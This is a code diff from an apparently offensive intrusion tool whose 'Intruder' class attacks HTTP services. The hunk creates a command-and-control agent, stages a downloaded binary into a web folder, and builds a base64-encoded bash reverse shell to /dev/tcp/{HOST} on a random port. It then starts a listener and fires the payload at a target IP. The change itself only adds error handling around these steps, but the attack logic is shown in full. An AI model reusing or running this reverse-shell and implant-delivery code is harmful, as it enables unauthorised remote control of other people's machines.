@@ -107,15 +107,19 @@ class Intruder:
                 print(f'[Slagroom] We got a little error on : {ip}')
                 return False
         elif service == 'http':
-            agent = self._apiClient.create_agent(targetos, ipAddress=ip)
-            self._apiClient.get_bin(agent['_id'], agent['communicationToken'], ip)
-            file_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
-            os.rename(f"tmp/{ip}", f"www/{file_name}")
-            shell_port = random.randint(40000, 50000)
-            revshell = f"bash -c ' bash -i >& /dev/tcp/{HOST}/{shell_port} 0>&1'"
-            base64_payload = base64.b64encode(revshell.encode('utf8')).decode('utf8')
-            threading.Thread(target=setup_socket, daemon=True, args=(shell_port, file_name)).start()
-            intrude_http('192.168.149.134', port, base64_payload)
+            try:
+                agent = self._apiClient.create_agent(targetos, ipAddress=ip)
+                self._apiClient.get_bin(agent['_id'], agent['communicationToken'], ip)
+                file_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
+                os.rename(f"tmp/{ip}", f"www/{file_name}")
+                shell_port = random.randint(40000, 50000)
+                revshell = f"bash -c ' bash -i >& /dev/tcp/{HOST}/{shell_port} 0>&1'"
+                base64_payload = base64.b64encode(revshell.encode('utf8')).decode('utf8')
+                threading.Thread(target=setup_socket, daemon=True, args=(shell_port, file_name)).start()
+                intrude_http('192.168.149.134', port, base64_payload)
+            except Exception as e:
+                print(f'[Slagroom] We got a little error on : {ip}')
+                return False
 
 
 def intrude_http(ip, port, payload):
